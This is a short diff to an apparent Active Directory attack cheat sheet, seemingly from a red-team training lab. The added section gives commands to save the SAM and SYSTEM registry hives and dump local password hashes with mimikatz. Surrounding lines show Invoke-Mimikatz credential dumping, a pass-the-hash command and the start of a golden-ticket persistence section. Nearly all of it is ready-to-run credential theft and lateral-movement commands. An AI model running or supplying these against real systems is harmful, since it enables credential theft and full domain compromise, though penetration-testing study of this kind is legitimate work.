@@ -480,6 +480,18 @@ Invoke-Mimikatz -Dumpcreds -ComputerName @("dcorp-ci","dcorp-mgmt")
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:<ntlm hash> /run:powershell.exe"'
 ```
 
+#### Mimikatz dump from SAM
+```
+reg save HKLM\SAM SamBkup.hiv
+reg save HKLM\System SystemBkup.hiv
+#Start mimikatz as administrator
+privilege::debug
+token::elevate
+lsadump::sam SamBkup.hiv SystemBkup.hiv
+```
+
+
+
 # Domain persistence
 ## Golden ticket
 The krbtgt user hash could be used to impersonate any user with any privileges from even a non domain machine.
